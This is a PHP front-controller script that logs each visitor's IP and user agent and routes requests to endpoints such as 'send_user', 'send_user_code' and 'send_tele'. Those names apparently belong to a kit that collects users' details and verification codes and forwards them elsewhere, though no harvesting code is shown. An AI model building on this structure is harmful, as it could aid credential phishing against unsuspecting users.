<?php
session_start();

if (!empty($_SERVER['HTTP_CLIENT_IP']))     
{  
    $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))    
{  
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
else  
{  
    $ip = $_SERVER['REMOTE_ADDR'];  
}
$_SESSION['ip'] = $ip;

$useragent = $_SERVER["HTTP_USER_AGENT"];

$_SESSION['useragent'] = $useragent;
require_once '../app/init.php'; 
require_once '../app/Router.php';
$router = new Router(); 
$router->add('GET', 'index', 'Index@index');
$router->add('GET', 'business', 'Business@index');
$router->add('GET', 'code', 'Code@index');
$router->add('GET', 'done', 'Done@index');
$router->add('GET', 'api/get_list', 'Api@get_list');
$router->add('GET', 'api/set_callback', 'Api@set_callback');
$router->add('POST', 'api/callback', 'Api@callback');
$router->add('POST', 'api/callback2', 'Api@callback2');
$router->add('POST', 'api/send_user', 'Api@send_user');
$router->add('POST', 'api/send_user_code', 'Api@send_user_code');
$router->add('POST', 'api/send_tele', 'Api@send_tele');
$router->add('GET', 'api/get_info_by_id', 'Api@get_info_by_id');
$router->add('GET', 'api/id/{id}', 'Api@get_info_by_id_2');
$router->add('GET', 'truncate', 'Index@truncate');
$url = isset($_GET['url']) ? filter_var(rtrim($_GET['url'], '/'), FILTER_SANITIZE_URL) : ''; 
$router->dispatch($url);
